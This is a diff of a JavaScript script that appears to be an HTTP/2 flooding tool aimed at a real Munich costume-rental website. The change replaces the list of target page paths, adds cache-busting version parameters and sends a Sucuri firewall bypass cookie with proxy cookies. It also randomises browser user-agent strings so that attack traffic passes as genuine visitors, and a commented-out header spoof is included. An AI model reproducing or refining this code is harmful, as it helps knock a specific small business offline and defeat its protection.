@@ -427,53 +427,16 @@ async function go() {
                                         .toString(36).replace(/[^a-z]+/g, "")}/`
                                 ]
                                 let linkAll = [
-                                    "/en/",
-                                    "/produkt/dirndl-inkl-bluse/",
-                                    "/produkt/lederhose/",
-                                    "/produkt/lederhose-set/",
-                                    "/produkt/haferlschuhe/",
-                                    "/lederhosenverleih-preise/",
-                                    "/lederhosenverleih-fuer-firmenkunden/",
-                                    "/kollektion/",
-                                    "/blog/",
-                                    "/kontakt/",
-                                    "/shop",
-                                    "/warenkorb-2/",
-                                    "/oeffnungszeiten",
-                                    "/lederhosenverleih-fuer-firmenkunden",
-                                    "/shop/",
-                                    "/lederhosenverleih-preise",
-                                    "/fruehlingsfest-2025-muenchen/",
-                                    "/2025/02/",
-                                    "/produkt/lederhose",
-                                    "/produkt/lederhose-set",
+                                    "/",
+                                    "/set-1-lederhose-traeger/",
+                                    "/set-2-lederhose-traeger-hemd/",
+                                    "/set-3-lederhose-traeger-socken/",
+                                    "/lederhose-mieten/",
+                                    "/set-5-dirndl-schurze/",
+                                    "/set-6-dirndl-schuerze-bluse/",
                                     "/impressum/",
                                     "/datenschutzerklaerung/",
-                                    "/en/pricing/",
-                                    "/dirndl-mieten",
-                                    "/produkt/haferlschuhe",
-                                    "/en/gallery/",
-                                    "/en/blog/",
-                                    "/category/unkategorisiert/",
-                                    "/author/constantin/",
-                                    "/fruehlingsfest-2024-uebernachtungstipps/",
-                                    "/2024/02/",
-                                    "/author/volker_quirling/",
-                                    "/lederhose-leihen/",
-                                    "/wann-beginnt-das-fruehlingsfest-2024-in-muenchen/",
-                                    "/2024/01/",
-                                    "/trachtenverleih-und-wirtshauswiesn-2020/",
-                                    "/2020/09/",
-                                    "/2016-die-wiesn-ist-vorbei/",
-                                    "/2016/10/",
-                                    "/tracht-und-kultur-in-muenchen/",
-                                    "/2016/05/",
-                                    "/go-kart-fahren-auf-dem-fruhlingsfest/",
-                                    "/2016/02/",
-                                    "/7-fakten-zur-auer-dult/",
-                                    "/oktoberfest-countdown/",
-                                    "/2016/01/",
-                                    "/blog/page/2/"
+                                    "/agb/"
                                 ];
 
                                 let linkRandom = getRandomPath(linkAll);
@@ -483,7 +446,7 @@ async function go() {
                                     ":method": "GET",
                                     ":authority": url.hostname,
                                     ":scheme": "https",
-                                    ":path": linkRandom, // Thử root path trước
+                                    ":path": linkRandom+'?v='+version, // Thử root path trước
                                     // "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36", // Fixed UA
                                     // "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                     "cookie": `sucuricp_tfca_6e453141ae697f9f78b18427b4c54df1=1; ${cookieOfProxy}`,
@@ -493,7 +456,7 @@ async function go() {
                                     "sec-ch-ua-platform": `"Windows"`,
                                     "upgrade-insecure-requests":
                                         Math.random() < 0.8 ? "1" : "0",
-                                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
+                                    // "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
                                     // accept:
                                     //     "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*!/!*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                                     "accept-encoding": "gzip, deflate, br, zstd",
@@ -503,6 +466,8 @@ async function go() {
                                             ]
                                     },q=0.${Math.floor(Math.random() * 9) + 1}`,
                                     referer: `https://www.google.com/`,
+                                    // 'X-Forwarded-For': '8.8.8.8',
+                                    "user-agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.${ver1}.${ver2} Safari/537.36`,
                                 });
 
 
